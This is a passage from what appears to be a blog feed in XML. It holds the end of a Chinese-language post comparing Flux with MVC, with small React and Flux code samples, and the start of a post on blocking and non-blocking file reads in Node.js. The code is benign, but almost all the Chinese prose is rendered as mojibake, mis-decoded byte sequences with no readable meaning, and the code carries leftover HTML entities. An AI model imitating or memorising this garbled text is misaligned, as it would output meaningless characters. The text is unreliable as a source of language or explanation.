AppDispatcher.register(function(payload) &#123;  switch( payload.actionName ) &#123;    case &#x27;newPhoto&#x27;:      PhotoStore.photos.push(payload.newPhoto);      // trigger &quot;Change&quot; event é€šçŸ¥Viewå»åšæ›´æ–°      PhotoStore.trigger(&#x27;change&#x27;);      break;  &#125;&#125;)

æ¥è‘—ï¼Œå¦‚æœä½ æ˜¯æ­é…Reactç•¶ä½œä½ çš„Viewçš„è©±ï¼Œå¯èƒ½æœƒåœ¨componentDidMountæ™‚ï¼Œbindingä¸€å€‹Store listener
componentDidMount: function() &#123;      PhotoStore.bind( &#x27;change&#x27;, this.photoChange );&#125;,

åœ¨listenerä¸­é‡æ–°fetch storeè³‡æ–™ï¼Œä¸¦ä¸”setStateä¾†re-render Component
photoChange: function() &#123;      var newPhotoData = PhotoStore.getPhoto();    this.setState(&#123;      photos: newPhotoData    &#125;);&#125;

ä½ çš„Componentçš„render functionå¤§æ¦‚æœƒåƒé€™æ¨£ï¼š
render: function() &#123;  var photosComponet = this.state.photos.map(function(photo, i)&#123;    return (      &lt;li key=&#123;&#x27;photo&#x27;+i&#125;&gt;        &#123;photo&#125;      &lt;/li&gt;    );            &#125;);  return (    &lt;div&gt;      &lt;ul&gt;        &#123;photosComponet&#125;      &lt;/ul&gt;    &lt;/div&gt;  );&#125;

çœ‹å®Œç°¡å–®çš„Fluxä»‹ç´¹å¾Œï¼Œè®“æˆ‘å€‘å†è¤‡ç¿’ä¸€æ¬¡Fluxçš„æµç¨‹åœ–

ç›¸ä¿¡åœ¨æ¥­ç•Œæ‰“æ»¾å¤šå¹´çš„Developerå€‘æ‡‰è©²æ—©æœ‰ç–‘æƒ‘äº†ï¼ŒFluxçš„é‚£å¼µåœ–ï¼Œè·Ÿæœ€åŸå§‹çš„MVCåœ–ä¸æ˜¯å¾ˆåƒå—ï¼Ÿï¼

Useræ“ä½œViewæ‰€ç”¢ç”Ÿçš„ä»»ä½•eventï¼Œéƒ½æœƒç¶“ç”±Controllerä¾†ä¿®æ”¹èˆ‡æ›´å‹•ç›¸é—œçš„Modelï¼Œè€ŒModelå†å‘ŠçŸ¥Viewæ˜¯å¦éœ€è¦åšæ›´å‹•ï¼Œè½èµ·ä¾†ä¹Ÿæ˜¯è »one-way directionçš„å‘€ã€‚
äº‹å¯¦ä¸Šï¼ŒMVC è·Ÿ Flux éƒ½åªæ˜¯ä¸€å€‹æ¦‚å¿µï¼Œå› æ­¤æœ‰å„ç¨®ä¸åŒçš„å¯¦ä½œï¼ŒåŠ ä¸ŠMVCåœ¨è³‡æ–™æµçš„è™•ç†ä¸Šï¼Œä¸¦ä¸åƒFluxä¸€èˆ¬æœ‰è¼ƒç‚ºæ˜ç¢ºçš„å®šç¾©ï¼Œå¤šæ•¸æ™‚å€™Modelçš„æ›´å‹•èˆ‡Viewçš„åˆ·æ–°å¯èƒ½æœƒé€éControllerä¾†ç®¡ç†ï¼Œè®“Modelå–®ç´”å­˜æ”¾dataã€‚
å¦‚æ­¤ä¸€ä¾†ï¼Œå‡è‹¥ä»Šå¤©Viewçš„æ“ä½œæ›´å‹•äº†Modelï¼Œè€ŒModelçš„è®ŠåŒ–åˆåˆ·æ–°äº†Viewï¼Œåœ¨ç³»çµ±é¾å¤§çš„æ™‚å€™ï¼Œä¸€ä¾†ä¸€å¾€ï¼Œå°±æœƒè®“ä½ çš„è³‡æ–™èˆ‡é é¢ç‹€æ…‹è®Šå¾—éå¸¸è¤‡é›œï¼Œè¦è¿½è¹¤æŸå€‹é é¢çš„è®Šå‹•åˆ°åº•æ˜¯èª°è§¸ç™¼çš„ï¼Œæˆ–æ˜¯å“ªå€‹è³‡æ–™æ”¹è®Šäº†ï¼Œä½ å¿…é ˆå¾Controllerå»æ…¢æ…¢traceã€‚è€Œè‹¥æ˜¯éµç…§Fluxçš„æµç¨‹ï¼Œä»»ä½•Viewçš„updateéƒ½åªè¦å»è¿½è¹¤å…¶Stateçš„ä¾†æºStoreå³å¯ï¼Œæœ‰ä¸€å€‹æ˜ç¢ºçš„flowå¯ä»¥éµå¾ªï¼Œä¸¦ä¸”æ¯å€‹Viewæ‰€éœ€è¦ç›£è½çš„è³‡æ–™ä¾†æºï¼Œå¯ä»¥ä¾ç…§Storeä¾†å€åˆ†ï¼Œé€™ä¹‹é–“çš„è³‡æ–™æµä¸æœƒäº’ç›¸å¹²æ“¾ã€‚å¦å¤–ä¸€å€‹Fluxçš„å¥½è™•æ˜¯ï¼Œèƒ½å¤ æ›´è¼•é¬†çš„åšå‡ºæ›´Unitçš„Unit testã€‚é€™æ˜¯ä½ åœ¨è¤‡é›œçš„Controllerä¸­é›£ä»¥é”æˆçš„ã€‚
ç•¶ç„¶ï¼Œä½ å¯èƒ½æœƒæƒ³ï¼šâ€œé€™æ˜¯ä½ MVCç”¨å¾—ä¸å¥½â€œã€‚ 
æˆ‘è¦ºå¾—é€™æ¨£è¬›ä¹Ÿæ²’ä»€éº¼ä¸å°ï¼Œå¦‚æœä½ MVCç”¨å¾—å¾ˆç†Ÿå¾ˆé †æ‰‹ï¼Œçš„ç¢ºå–®å–®æ˜¯Fluxé€™å€‹æ±è¥¿å°ä½ çš„èª˜å› å¯èƒ½ä¸é«˜ï¼Œä½†ç•¶ä¸€é–“æ˜æ˜Ÿå…¬å¸å¤§åŠ›Promoteï¼Œå°æ–¼åŸºæœ¬æ¦‚å¿µçš„å®šç¾©åˆå¤ æ¸…æ¥šå–®ç´”æ™‚ï¼Œé‚„æ˜¯å€¼å¾—ä½ è©¦è©¦ã€‚æ›´åˆ¥èªªFluxæ­é…ä¸ŠReactçš„å®£å‘Šå¼å¯«æ³•ï¼Œç”¨èµ·ä¾†æ›´æ˜¯å¦‚é­šå¾—æ°´ã€‚
çµè«–Fluxåšçš„æ˜¯ï¼š

æ”¹å–„è³‡æ–™ç‹€æ…‹èˆ‡è¦–åœ–ç‹€æ…‹çš„ Data Flow
è®“é é¢çš„ç‹€æ…‹Predictable
è³‡æ–™æµä¸æœƒäº’ç›¸æ±¡æŸ“
è®“ä½ çš„æ¸¬è©¦æ›´åŠ å®¹æ˜“

è€ŒMVCåœ¨é—œæ³¨é»åˆ†é›¢ä¸Šçš„è²¢ç»ä¸å¯å°è¦·ï¼Œé‡è¦–åœ¨å°‡è³‡æ–™(Model)ã€è¦–åœ–(View)ã€é‚è¼¯(Controller)æ‹†é–‹ï¼Œå„è‡ªè² è²¬å„è‡ªçš„å·¥ä½œã€‚
å› æ­¤ä¸¦éæ˜¯MVCä¸å¥½ã€ä¸å°ï¼Œæ‰€ä»¥æˆ‘å€‘æ‡‰è©²æ¡ç”¨Fluxï¼›Fluxæ˜¯åœ¨MVCå»ºç«‹çš„åŸºç¤ä¸‹ï¼Œå®šç¾©å‡ºä¸€å€‹æ¸…æ¥šçš„one-way directionè³‡æ–™æµï¼Œä¸¦ä¸”é€éActionã€Dispatcherèˆ‡Storeä¾†å¹«åŠ©æ•´å€‹æ¦‚å¿µçš„å¯¦ç¾ã€‚
One more thingå¦‚åŒå‰é¢æ‰€æï¼ŒFluxçš„å¯¦ä½œæœ‰å¾ˆå¤šç¨®ï¼Œé€™é‚Šä»‹ç´¹çš„åªæ˜¯æœ€åŸºæœ¬çš„æµç¨‹ï¼Œå¾ˆå¤šFrameworkåœ¨è¨­è¨ˆè‡ªå·±çš„Dispatcher, Action èˆ‡ Storeæ™‚ï¼Œæœƒæœ‰ä¸åŒçš„æ–¹å¼ï¼Œæˆ–è¨±å¯ä»¥å¾é€™é‚Šçš„æ¯”è¼ƒä¸‹å»çœ‹çœ‹

Flux Comparison
Awesome React

åƒè€ƒè³‡æ–™

Flux for stupid people
Facebook: MVC Does Not Scale, Use Flux Instead

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>MVC</tag>
        <tag>Flux</tag>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript ä¸­çš„åŒæ­¥èˆ‡éåŒæ­¥ï¼ˆä¸Šï¼‰ï¼šå…ˆæˆç‚º callback å¤§å¸«å§ï¼</title>
    <url>/2019/10/05/javascript-async-sync-and-callback/</url>
    <content><![CDATA[å‰è¨€å¦‚æœè¦èˆ‰å‡ºä¸€å€‹åœ¨ JavaScript è£¡é¢å¾ˆé‡è¦ä¹Ÿå¾ˆå¸¸ç”¨ï¼Œä½†æ–°æ‰‹å¸¸å¸¸ææ··çš„æ¦‚å¿µï¼Œé‚£ã€ŒéåŒæ­¥ï¼ˆAsynchronousï¼‰ã€ç•¶ä»ä¸è®“ï¼Œçµ•å°æ˜¯ç¬¬ä¸€åã€‚è·Ÿå…¶ä»–é‚£äº› thisã€closureã€prototype æˆ–æ˜¯ hoisting æ¯”èµ·ä¾†ï¼ŒéåŒæ­¥åœ¨å¯¦éš›é–‹ç™¼çš„æ™‚å€™ç”¨åˆ°çš„é »ç‡é«˜å¤ªå¤šäº†ï¼Œè€Œä¸”æ˜¯åˆå­¸è€…å¸¸å¸¸æœƒè¸©å‘çš„åœ°æ–¹ã€‚
éåŒæ­¥çœŸçš„é‚£éº¼é›£å—ï¼Ÿ
æˆ‘ç›¸ä¿¡ä¸æ˜¯çš„ã€‚åªè¦å¾ªè‘—ä¸€å€‹æ­£ç¢ºçš„è„ˆçµ¡å‰é€²ï¼Œå°±å¯ä»¥å¾ªåºæ¼¸é€²ç†è§£ç‚ºä»€éº¼éœ€è¦éåŒæ­¥ï¼Œä¹Ÿèƒ½çŸ¥é“åœ¨ JavaScript è£¡é¢æ˜¯æ€éº¼è™•ç†é€™ç¨®æ“ä½œçš„ã€‚
é¡ä¼¼çš„ä¸»é¡Œæˆ‘å…¶å¯¦åœ¨å››å¹´å‰å°±å¯«éï¼Œä½†ç¾åœ¨å›é ­çœ‹å¯¦åœ¨æ˜¯å¯«å¾—æ»¿å·®çš„ï¼Œæ‰€ä»¥å››å¹´å¾Œé‡æ–°æŒ‘æˆ°é€™å€‹ä¸»é¡Œï¼Œå¸Œæœ›èƒ½å¯«å‡ºä¸€ç¯‡å“è³ªä¸éŒ¯çš„æ–‡ç« ï¼ŒæŠŠéåŒæ­¥é€™ä»¶äº‹æƒ…è¬›æ¸…æ¥šã€‚
åœ¨å¯«é€™ç¯‡æ–‡ç« ä¹‹å‰ï¼Œåƒè€ƒäº† Node.js çš„å®˜æ–¹æ–‡ä»¶ï¼Œç™¼ç¾åœ¨éåŒæ­¥çš„è¬›è§£ä¸Šå…¶å¯¦åšå¾—ä¸éŒ¯ï¼Œå› æ­¤æœ¬æ–‡æœƒä»¥é¡ä¼¼çš„åˆ‡å…¥é»é–‹å§‹è«‡é€™å€‹å•é¡Œã€‚å¦‚æœä¸æœƒ Node.js ä¹Ÿæ²’é—œä¿‚ï¼Œæˆ‘åº•ä¸‹æœƒç¨å¾®åšé»ä»‹ç´¹ã€‚
å»ºè­°é–±è®€æœ¬æ–‡ä»¥å‰éœ€è¦å…·å‚™ JavaScript åŸºç¤ï¼ŒçŸ¥é“å¦‚ä½•ä½¿ç”¨ JavaScript æ“ä½œ DOMï¼Œä¹ŸçŸ¥é“ä»€éº¼æ˜¯ ajaxã€‚
æ¥è‘—å°±è®“æˆ‘å€‘é–‹å§‹å§ï¼


Node.js åŸºæœ¬ä»‹ç´¹JavaScript æ˜¯ä¸€å€‹ç¨‹å¼èªè¨€ï¼Œæœƒæœ‰ç¨‹å¼èªè¨€æœ¬èº«æ‰€è¦ç¯„å¯ä»¥ç”¨çš„æ±è¥¿ï¼Œä¾‹å¦‚èªªç”¨varå®£å‘Šè®Šæ•¸ï¼Œç”¨if elseé€²è¡Œåˆ¤æ–·ï¼Œæˆ–è€…æ˜¯ä½¿ç”¨functionå®£å‘Šå‡½å¼ï¼Œé€™äº›æ±è¥¿éƒ½æ˜¯ JavaScript é€™å€‹ç¨‹å¼èªè¨€æœ¬èº«å°±æœ‰çš„éƒ¨åˆ†ã€‚
æ—¢ç„¶æˆ‘ä¸Šé¢èªªäº†ã€Œç¨‹å¼èªè¨€æœ¬èº«å°±æœ‰çš„éƒ¨åˆ†ã€ï¼Œå°±ä»£è¡¨ä¹Ÿæœ‰ä¸€äº›æ±è¥¿å…¶å¯¦æ˜¯ã€Œä¸å±¬æ–¼ JavaScript é€™å€‹ç¨‹å¼èªè¨€çš„ã€ã€‚
ä¾‹å¦‚èªªdocument.querySelector(&#39;body&#39;)ï¼Œå¯ä»¥è®“ä½ æ‹¿åˆ° body çš„ DOM ç‰©ä»¶ä¸¦ä¸”å°å®ƒåšæ“ä½œï¼Œè€Œæ“ä½œä¹‹å¾Œæœƒå³æ™‚åæ‡‰åœ¨ç€è¦½å™¨çš„ç•«é¢ä¸Šã€‚
é€™å€‹ document æ˜¯å“ªä¾†çš„ï¼Ÿå…¶å¯¦æ˜¯ç€è¦½å™¨çµ¦ JavaScript çš„ï¼Œé€™æ¨£æ‰èƒ½è®“ JavaScript é€é document é€™å€‹ç‰©ä»¶èˆ‡ç€è¦½å™¨é€²è¡Œæºé€šï¼Œä¾†æ“æ§ DOMã€‚
å¦‚æœä½ å»ç¿» ECMAScript çš„æ–‡ä»¶ï¼Œä½ æœƒç™¼ç¾è£¡é¢å®Œå…¨æ²’æœ‰å‡ºç¾documenté€™å€‹æ±è¥¿ï¼Œå› ç‚ºå®ƒä¸æ˜¯é€™å€‹ç¨‹å¼èªè¨€æœ¬èº«çš„ä¸€éƒ¨ä»½ï¼Œè€Œæ˜¯ç€è¦½å™¨æä¾›çš„ã€‚
å¦‚æœåœ¨ç€è¦½å™¨ä¸Šé¢è·‘ JavaScriptï¼Œæˆ‘å€‘å¯ä»¥æŠŠç€è¦½å™¨ç¨±ä½œæ˜¯ JavaScript çš„ã€ŒåŸ·è¡Œç’°å¢ƒï¼ˆruntimeï¼‰ã€ï¼Œå› ç‚º JavaScript å°±è·‘åœ¨ä¸Šé¢å˜›ï¼Œååˆ†åˆç†ã€‚
é™¤äº† document ä»¥å¤–ï¼Œåƒæ˜¯æ‹¿ä¾†è¨ˆæ™‚çš„ setTimeout èˆ‡ setIntervalï¼Œæ‹¿ä¾†åš ajax çš„ XMLHttpRequest èˆ‡ fetchï¼Œé€™äº›éƒ½æ˜¯ç€è¦½å™¨é€™å€‹åŸ·è¡Œç’°å¢ƒæ‰€æä¾›çš„æ±è¥¿ã€‚
é‚£å¦‚æœæ›äº†ä¸€å€‹åŸ·è¡Œç’°å¢ƒï¼Œæ˜¯ä¸æ˜¯å°±æœ‰ä¸åŒçš„æ±è¥¿å¯ä»¥ç”¨ï¼Ÿé™¤äº†ç€è¦½å™¨ä»¥å¤–ï¼Œé‚„æœ‰åˆ¥çš„ JavaScript çš„åŸ·è¡Œç’°å¢ƒå—ï¼Ÿ
çœŸå·§ï¼Œé‚„çœŸçš„å‰›å¥½æœ‰ï¼Œè€Œä¸”å‰›å¥½ä½ ä¹Ÿè½éï¼Œå°±å«åš Node.jsã€‚
æœ‰å¾ˆå¤šäººéƒ½ä»¥ç‚ºå®ƒæ˜¯ä¸€å€‹ JavaScript çš„ libraryï¼Œä½†å…¶å¯¦ä¸ç„¶ï¼Œä¸éä¹Ÿä¸èƒ½æ€ªå¤§å®¶ï¼Œå› ç‚ºæœ€å¾Œçš„.jså…©å€‹å­—å¾ˆå®¹æ˜“è®“äººèª¤è§£ã€‚å¦‚æœä½ è¦ºå¾—é‚£å…©å€‹å­—ä¸€ç›´èª¤å°ä½ çš„è©±ï¼Œå¯ä»¥æš«ä¸”æŠŠå®ƒå«åš Node å°±å¥½ã€‚
Node.js å…¶å¯¦æ˜¯ JavaScript çš„ä¸€å€‹åŸ·è¡Œç’°å¢ƒï¼Œå°±å¦‚åŒå®ƒè‡ªå·±åœ¨å®˜ç¶²ä¸Šæ‰€èªªçš„ï¼š

Node.jsÂ® is a JavaScript runtime built on Chromeâ€™s V8 JavaScript engine.

æ‰€ä»¥ JavaScript ç¨‹å¼ç¢¼å¯ä»¥é¸æ“‡è·‘åœ¨ç€è¦½å™¨ä¸Šï¼Œå°±å¯ä»¥é€éç€è¦½å™¨é€™å€‹åŸ·è¡Œç’°å¢ƒæä¾›çš„æ±è¥¿æ“æ§ç•«é¢ï¼Œæˆ–è€…æ˜¯ç™¼ Request å‡ºå»ï¼›ä¹Ÿå¯ä»¥é¸æ“‡è·‘åœ¨ Node.js é€™å€‹åŸ·è¡Œç’°å¢ƒä¸Šé¢ï¼Œå°±å¯ä»¥åˆ©ç”¨ Node.js æä¾›çš„æ±è¥¿ã€‚
é‚£ Node.js æä¾›äº†ä»€éº¼å‘¢ï¼Ÿä¾‹å¦‚èªªfsï¼Œå…¨ç¨±ç‚º file systemï¼Œæ˜¯æ§åˆ¶æª”æ¡ˆçš„ä»‹é¢ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ JavaScript ä¾†è®€å¯«é›»è…¦è£¡çš„æª”æ¡ˆï¼é‚„æä¾›äº†httpé€™å€‹æ¨¡çµ„ï¼Œå¯ä»¥ç”¨ JavaScript ä¾†å¯« serverï¼
è©³æƒ…è«‹åƒè€ƒåº•ä¸‹çš„ç¤ºæ„åœ–ï¼š

å¯ä»¥å¾ˆæ¸…æ¥šåœ°çœ‹åˆ°ç•¶ JavaScript åœ¨ä¸åŒç’°å¢ƒåº•ä¸‹åŸ·è¡Œæ™‚ï¼Œå¯ä»¥ç”¨çš„æ±è¥¿ä¹Ÿä¸ä¸€æ¨£ï¼Œç«¯çœ‹åŸ·è¡Œç’°å¢ƒæä¾›äº†ä»€éº¼ã€‚çœ¼å°–çš„äººå¯èƒ½æœƒç™¼ç¾ä¸Šåœ–ä¸­ setTimeout åœ¨å…©å€‹ç’°å¢ƒéƒ½æœ‰å‡ºç¾ï¼Œé€™æ˜¯ç‚ºä»€éº¼å‘¢ï¼Ÿ
å› ç‚ºé€™å…©å€‹ç’°å¢ƒéƒ½è¦ºå¾—è¨ˆæ™‚å™¨é€™åŠŸèƒ½å¾ˆé‡è¦ï¼Œæ‰€ä»¥éƒ½æä¾›äº† setTimeout é€™å€‹å‡½å¼çµ¦é–‹ç™¼è€…ä½¿ç”¨ã€‚åœ¨å…©å€‹ç’°å¢ƒä¸Šçš„åŠŸèƒ½é›–ç„¶æ˜¯ä¸€æ¨¡ä¸€æ¨£çš„ï¼Œä½†è¦æ³¨æ„çš„æ˜¯å› ç‚ºåŸ·è¡Œç’°å¢ƒä¸åŒï¼Œæ‰€ä»¥èƒŒå¾Œçš„å¯¦ä½œæ–¹å¼ä»¥åŠåŸç†ä¹Ÿä¸åŒã€‚
å¦å¤–ï¼ŒåŸ·è¡Œç’°å¢ƒä¸åŒï¼ŒåŸ·è¡Œæ–¹å¼ä¹Ÿæœƒä¸åŒã€‚ä»¥ç€è¦½å™¨ä¾†èªªï¼Œå°±æ˜¯ç”¨&lt;script src=&quot;index.js&quot;&gt;å»å¼•å…¥ä¸€å€‹ JavaScript æª”æ¡ˆï¼Œå°±å¯ä»¥åœ¨ç€è¦½å™¨ä¸ŠåŸ·è¡Œï¼›ä»¥ Node.js ä¾†èªªï¼Œå¿…é ˆå…ˆåœ¨é›»è…¦ä¸Šå®‰è£ Node.js é€™å€‹åŸ·è¡Œç’°å¢ƒï¼Œç„¶å¾Œä»¥ CLI çš„æ–¹å¼ç”¨node index.jsé€™å€‹æŒ‡ä»¤ä¾†åŸ·è¡Œã€‚
å¹«å¤§å®¶æ•´ç†ä¸€ä¸‹ç›®å‰çš„é‡é»ï¼š

JavaScript åªæ˜¯ç¨‹å¼èªè¨€ï¼Œéœ€è¦æ­é…åŸ·è¡Œç’°å¢ƒæä¾›çš„æ±è¥¿ï¼Œä¾‹å¦‚èªª setTiemoutã€document ç­‰ç­‰
æœ€å¸¸è¦‹çš„ JavaScript åŸ·è¡Œç’°å¢ƒæœ‰å…©å€‹ï¼Œä¸€å€‹æ˜¯ç€è¦½å™¨ï¼Œä¸€å€‹æ˜¯ Node.js
ä¸åŒçš„åŸ·è¡Œç’°å¢ƒæœƒæä¾›ä¸åŒçš„æ±è¥¿ï¼Œä¾‹å¦‚èªª Node.js æä¾›äº† http é€™å€‹æ¨¡çµ„è®“ JavaScript å¯ä»¥å¯«ä¸€å€‹ä¼ºæœå™¨ï¼Œä½†ç€è¦½å™¨å°±æ²’æœ‰æä¾›é€™ç¨®æ±è¥¿

å†ä¾†ï¼Œæˆ‘å€‘æœƒä»¥ Node.js çš„è§’åº¦ä¾†é–‹å§‹ä»‹ç´¹åŒæ­¥èˆ‡éåŒæ­¥ã€‚
é˜»å¡èˆ‡éé˜»å¡å‰é¢æœ‰æé Node.js æœ‰æä¾›æ§åˆ¶æª”æ¡ˆçš„ä»‹é¢ï¼Œè®“æˆ‘å€‘å¯ä»¥å¯«ä¸€æ®µ JavaScript ä¾†è®€å–èˆ‡å¯«å…¥æª”æ¡ˆï¼Œè®“æˆ‘å€‘ä¾†çœ‹ä¸€æ®µå¯¦éš›çš„ç¨‹å¼ç¢¼ï¼š
const fs = require(&#x27;fs&#x27;) // å¼•å…¥å…§å»º file system æ¨¡çµ„const file = fs.readFileSync(&#x27;./README.md&#x27;) // è®€å–æª”æ¡ˆconsole.log(file) // å°å‡ºå…§å®¹

ä¸Šé¢é€™æ®µç¨‹å¼ç¢¼å…ˆå¼•å…¥Node.js æä¾›çš„å…§å»ºæ¨¡çµ„fsï¼Œå†ä¾†ä½¿ç”¨fs.readFileSyncä¾†è®€å–æª”æ¡ˆï¼Œæœ€å¾ŒæŠŠæª”æ¡ˆçš„å…§å®¹ç”¨console.logçµ¦å°å‡ºä¾†ã€‚
ï¼ˆé™„è¨»ï¼šå…¶å¯¦ä¸Šé¢å°å‡ºä¾†çš„æ±è¥¿æœƒæ˜¯ä¸€å€‹Bufferï¼Œå®Œæ•´ç¨‹å¼ç¢¼æ‡‰è©²ç‚ºfile.toString(&#39;utf8&#39;)æ‰æœƒå°å‡ºæª”æ¡ˆå…§å®¹ã€‚ä½†å› ç‚ºé€™å€‹å°ç´°ç¯€ä¸å¦¨ç¤™ç†è§£ï¼Œæ‰€ä»¥åœ¨ç¯„ä¾‹ç¨‹å¼ç¢¼ä¸­åˆ»æ„å¿½ç•¥ï¼‰
çœ‹èµ·ä¾†å¥½åƒæ²’ä»€éº¼å•é¡Œâ€¦å—ï¼Ÿ
å¦‚æœæª”æ¡ˆå°çš„è©±çš„ç¢ºæ˜¯æ²’ä»€éº¼å•é¡Œï¼Œä½†å¦‚æœæª”æ¡ˆå¾ˆå¤§å‘¢ï¼Ÿä¾‹å¦‚èªªæª”æ¡ˆæœ‰ 777 MB å¥½äº†ï¼Œè¦æŠŠé€™éº¼å¤§çš„æª”æ¡ˆè®€é€²è¨˜æ†¶é«”ï¼Œå¯èƒ½è¦èŠ±å€‹å¹¾ç§’é˜ç”šè‡³æ›´ä¹…ã€‚
åœ¨è®€å–æª”æ¡ˆçš„æ™‚å€™ï¼Œç¨‹å¼å°±æœƒåœåœ¨ç¬¬äºŒè¡Œï¼Œè¦ç­‰è®€å–æª”æ¡ˆå®Œç•¢ä»¥å¾Œï¼Œæ‰æœƒæŠŠæª”æ¡ˆå…§å®¹æ”¾åˆ° file é€™å€‹è®Šæ•¸è£¡ï¼Œä¸¦ä¸”åŸ·è¡Œç¬¬ä¸‰è¡Œconsole.log(file)ã€‚
æ›å¥è©±èªªï¼Œfs.readFileSyncé€™å€‹ methodã€Œé˜»æ“‹ã€äº†å¾ŒçºŒæŒ‡ä»¤çš„åŸ·è¡Œï¼Œé€™æ™‚å€™æˆ‘å€‘å°±èªªé€™å€‹ method æ˜¯é˜»å¡ï¼ˆblockingï¼‰çš„ï¼Œå› ç‚ºç¨‹å¼çš„åŸ·è¡Œæœƒä¸€ç›´ block åœ¨é€™è£¡ï¼Œç›´åˆ°åŸ·è¡Œå®Œç•¢ä¸¦ä¸”æ‹¿åˆ°å›å‚³å€¼ç‚ºæ­¢ã€‚
å¦‚æœå¾ŒçºŒçš„æŒ‡ä»¤æœ¬ä¾†å°±éƒ½è¦ç­‰åˆ°æª”æ¡ˆè®€å–å®Œç•¢æ‰èƒ½åŸ·è¡Œï¼Œä¾‹å¦‚èªªåœ¨æª”æ¡ˆè£¡é¢å°‹æ‰¾æŸå€‹å­—ä¸²ç­‰ç­‰ï¼Œé€™æ¨£çš„æ–¹å¼å…¶å¯¦æ²’ä»€éº¼å•é¡Œã€‚ä½†å¦‚æœå¾ŒçºŒæœ‰äº›æŒ‡ä»¤è·Ÿè®€å–æª”æ¡ˆå®Œå…¨ä¸ç›¸å¹²ï¼Œé€™ä¸å°±è™§å¤§äº†å—ï¼Ÿ
èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœæˆ‘å€‘æƒ³è¦è®€å–æª”æ¡ˆï¼Œä¸¦ä¸”æ‰¾å‡º 1 åˆ° 99999999 ä¹‹é–“çš„å¶æ•¸ï¼š
const fs = require(&#x27;fs&#x27;)const file = fs.readFileSync(&#x27;./README.md&#x27;) // åœ¨é€™é‚Šç­‰å¥½å¹¾ç§’æ‰å¾€ä¸‹åŸ·è¡Œconsole.log(file)  const arr = []for (let i = 2; i &lt;= 99999999; i+=2) &#123;  arr.push(i)&#125;  console.log(arr)

ä¸Šé¢çš„ç¨‹å¼ç¢¼æœƒå…ˆåœ¨è®€å–æª”æ¡ˆé‚£ä¸€è¡Œå¡å€‹å¹¾ç§’ï¼Œæ¥è‘—æ‰åŸ·è¡Œä¸‹é¢çš„é‚£ä¸€å€‹éƒ¨åˆ†ï¼Œç®—å‡º 1 åˆ° 99999999 ä¹‹é–“çš„å¶æ•¸ä¸¦ä¸”å°å‡ºä¾†ã€‚
é€™å…©ä»¶äº‹æƒ…æ˜æ˜ä¸€é»é—œè¯éƒ½æ²’æœ‰ï¼Œæ†‘ä»€éº¼å°å‡ºå¶æ•¸é€™ä»¶äº‹æƒ…è¦ç­‰è®€å–æª”æ¡ˆè®€å®Œæ‰èƒ½åšï¼Ÿé›£é“å…©ä»¶äº‹æƒ…ä¸èƒ½åŒæ™‚åšå—ï¼Ÿé€™æ¨£è±ˆä¸æ˜¯æ›´æœ‰æ•ˆç‡ï¼Ÿ
é‚„çœŸçš„æœ‰é€™ç¨®æ±è¥¿ï¼Œæœ‰å¦å¤–ä¸€ç¨®æ–¹æ³•å¯ä»¥è®“é€™å…©ä»¶äº‹æƒ…åŒæ™‚é€²è¡Œã€‚
åŸæœ¬readFileSyncçš„å•é¡Œåœ¨æ–¼å®ƒæœƒé˜»å¡å¾ŒçºŒç¨‹å¼ç¢¼çš„åŸ·è¡Œï¼Œå°±å¥½åƒæˆ‘å»å®¶è£¡é™„è¿‘çš„æ»·å‘³æ”¤è²·æ»·å‘³ï¼Œé»å¥½äº†äº¤çµ¦è€é—†ä¹‹å¾Œå°±è¦ç«™åœ¨æ—é‚Šç­‰ï¼Œå“ªè£¡ä¹Ÿä¸èƒ½å»ï¼Œå› ç‚ºæˆ‘æƒ³åƒåˆ°ç†±é¨°é¨°çš„æ»·å‘³ã€‚å¦‚æœæˆ‘å›å®¶äº†ç„¶å¾Œæ¯éš”ååˆ†é˜å†éä¾†ï¼Œå¯èƒ½æ»·å‘³å·²ç¶“å†·æ‰äº†ï¼Œæˆ‘ä¸æƒ³é€™æ¨£ï¼Œæˆ‘è²·çš„åˆä¸æ˜¯å†°æ»·å‘³ã€‚
æ‰€ä»¥æˆ‘åªèƒ½ç«™åœ¨æ—é‚Šç™¡ç™¡ç­‰ï¼Œç™¡ç™¡å†·ï¼Œæ‰èƒ½åœ¨ç¬¬ä¸€æ™‚é–“å°±æ‹¿åˆ°å‰›èµ·é‹çš„æ»·å‘³ã€‚
é˜»å¡ï¼ˆblockingï¼‰çš„å°ç…§å°±å«åšéé˜»å¡ï¼ˆnon-blockingï¼‰ï¼Œæ„æ€å°±æ˜¯ä¸æœƒé˜»æ“‹å¾ŒçºŒç¨‹å¼ç¢¼çš„åŸ·è¡Œï¼Œå°±å¥½åƒæˆ‘å»ç™¾è²¨å…¬å¸ç¾é£Ÿè¡—é»é¤ä¸€æ¨£ï¼Œé»å®Œä»¥å¾Œåº—å®¶æœƒçµ¦æˆ‘ä¸€å€‹å‘¼å«å™¨ï¼ˆæœ¬é«”æ˜¯ç´…èŒ¶çš„é‚£é–“é€Ÿé£Ÿåº—ä¹Ÿæœ‰ï¼‰ï¼Œæˆ‘æ‹¿åˆ°å‘¼å«å™¨ä»¥å¾Œå°±å¯ä»¥å›ä½å­ä¸Šç­‰ï¼Œæˆ–æˆ‘æƒ³å…ˆå»é€›å€‹è¡—ä¹Ÿå¯ä»¥ã€‚ç­‰åˆ°é¤é»æº–å‚™å¥½çš„æ™‚å€™ï¼Œå‘¼å«å™¨å°±æœƒéŸ¿ï¼Œæˆ‘å°±å¯ä»¥å»åº—å®¶é ˜å–é¤é»ï¼Œä¸ç”¨åœ¨åŸåœ°å‚»å‚»åœ°ç­‰ã€‚
ä»¥è®€å–æª”æ¡ˆä¾†èªªï¼Œå¦‚æœæ˜¯éé˜»å¡çš„è©±ï¼Œæ˜¯æ€éº¼åšåˆ°çš„å‘¢ï¼Ÿå¦‚æœä¸æœƒé˜»æ“‹å¾ŒçºŒç¨‹å¼ç¢¼åŸ·è¡Œï¼Œé‚£æˆ‘è©²æ€éº¼æ‹¿åˆ°æª”æ¡ˆçš„å…§å®¹ï¼Ÿ
